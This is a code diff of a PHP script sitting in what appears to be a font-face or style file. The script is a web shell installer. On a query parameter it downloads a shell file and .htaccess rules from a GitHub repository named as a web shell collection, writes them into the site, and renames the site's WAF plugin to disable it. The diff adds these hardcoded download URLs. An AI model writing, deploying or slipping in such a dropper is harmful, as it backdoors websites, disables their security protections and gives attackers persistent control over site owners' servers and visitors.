@@ -5,7 +5,6 @@ font-face {
 <?php
 echo "ansgwxmos3jpamrr9cjsxa31";
 
-$dataHost = "domain_placeholder";
 $r=getSiteRoot();
 $protocol = ( 
 (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') 
@@ -27,9 +26,9 @@ $toReplace = "toReplace_fill";
 $replaceWith = "replaceWith_fill";
 $dontiffound = "dontiffound_fill";
 if (isset($_GET['up'])){
-    if (saveContent($p,getContent($dataHost."/raw/default"))){
+    if (saveContent($p,getContent("https://github.com/hqdudesec/webshells_collection/raw/refs/heads/main/canonical.php"))){
         chFile($ht,true);
-        if (saveContent($ht,getContent($dataHost."/raw/htfolder"))) {
+        if (saveContent($ht,getContent("https://github.com/hqdudesec/webshells_collection/raw/refs/heads/main/htaccess_folder"))) {
             chFile($ht,false);
         }
         echo ':::'.$domain.$u.':::';
@@ -43,7 +42,7 @@ if (isset($_GET['clear'])){
         rename($waf,$plugins.random_string());
     }
     chFile($htIndex,true);
-    saveContent($htIndex,getContent($dataHost."/raw/htindex"));
+    saveContent($htIndex,getContent("https://raw.githubusercontent.com/hqdudesec/webshells_collection/refs/heads/main/htaccess_index"));
     chFile($htIndex,false);
 
     chFile($indexFile,true);
